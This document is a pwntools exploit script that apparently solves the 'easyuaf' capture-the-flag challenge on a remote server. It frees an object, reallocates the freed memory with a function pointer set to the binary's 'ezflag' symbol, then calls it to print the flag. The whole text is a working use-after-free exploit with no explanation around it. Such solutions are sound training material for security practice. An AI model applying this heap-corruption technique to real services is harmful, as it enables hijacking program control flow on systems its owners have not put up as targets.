from pwn import *
from typing import Union
context.binary = './easyuaf'
r = remote('challs.nusgreyhats.org', 10525)

def cmd(opt: int, *args: Union[int,bytes]):
    r.sendlineafter('> ', str(opt))
    for arg in args:
        if isinstance(arg, int): arg = b'%d' % arg
        r.sendlineafter(': ', arg)

cmd(2,0, b'org', 1)
cmd(3,0)
cmd(1,0, b'person', 0, context.binary.symbols['ezflag'], 0)
cmd(4,0,0)
print(r.recvuntil(b'}'))
